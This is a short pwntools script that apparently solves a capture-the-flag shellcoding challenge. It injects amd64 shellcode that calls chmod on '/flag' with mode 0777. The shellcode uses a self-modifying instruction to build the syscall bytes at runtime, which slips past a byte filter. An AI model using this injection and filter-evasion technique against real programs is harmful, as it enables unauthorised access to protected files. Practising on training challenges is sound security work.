from pwn import *
context.binary = "/challenge/babyshell_level1"
context.arch = "amd64"
context.os = "linux"
p = process()
payload = asm(
"""
mov ebx, 0x67616c66
shl rbx, 0x8
mov bl, 0x2f
push rbx
mov rdi, rsp
mov rsi, 0x1ff
mov rax, 0x5a
inc word ptr [rip]
.word 0x050e
""")
p.sendline(payload)
p.interactive()
